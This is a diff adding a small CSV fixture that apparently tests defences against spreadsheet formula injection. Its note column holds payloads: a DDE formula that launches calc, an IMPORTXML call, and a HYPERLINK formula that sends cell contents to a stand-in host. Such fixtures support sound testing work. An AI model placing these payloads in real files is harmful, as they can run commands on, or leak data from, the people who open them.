@@ -1,0 +1,7 @@
+id,name,note,phone,balance
+1,Alice,welcome aboard,+1 555-0100,-25.00
+2,Bob,=1+1,+44 20 7946 0000,-1250.50
+3,Mallory,"=cmd|' /C calc'!A0",+81 90-1234-5678,0
+4,Eve,"=IMPORTXML(""http://example.test/x"",""//a"")",+1 555-0142,42.00
+5,Trent,@SUM(A1:A9),+1 555-0177,-3.50
+6,Peggy,=HYPERLINK("http://example.test?leak="&A1),+1 555-0188,17.25
